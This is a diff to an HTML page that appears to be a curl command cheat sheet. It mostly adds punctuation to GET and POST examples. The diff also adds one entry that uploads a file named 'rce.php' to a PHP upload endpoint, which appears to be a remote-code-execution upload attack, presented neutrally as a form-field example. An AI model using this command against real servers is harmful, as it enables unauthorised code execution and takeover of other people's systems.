@@ -16,12 +16,17 @@
     </ul>
     <ul>
         <li><code>$ curl -X GET https://api.example.com/resource
-        </code> <br><br>> send a GET request <br><br></li>
+        </code> <br><br>> send a GET request. <br><br></li>
     </ul>
     <ul>
         <li><code>$ curl -X POST -d "key1=value1&key2=value2" https://api.example.com/resource
-        </code> <br><br>> send a POST request with data <br><br></li>
+        </code> <br><br>> send a POST request with data. <br><br></li>
     </ul>
+    <ul>
+        <li><code>$ curl -F 'bigUploadFile=@rce.php' 'http://example.com/bigUpload.php?action=post-unsupported'
+        </code> <br><br>> -F flag specifies a form field (bigUploadFile) with the file content. <br><br></li>
+    </ul>
+
     <button onclick="goBack()">Back</button>
 
     <script src="note.js"></script>
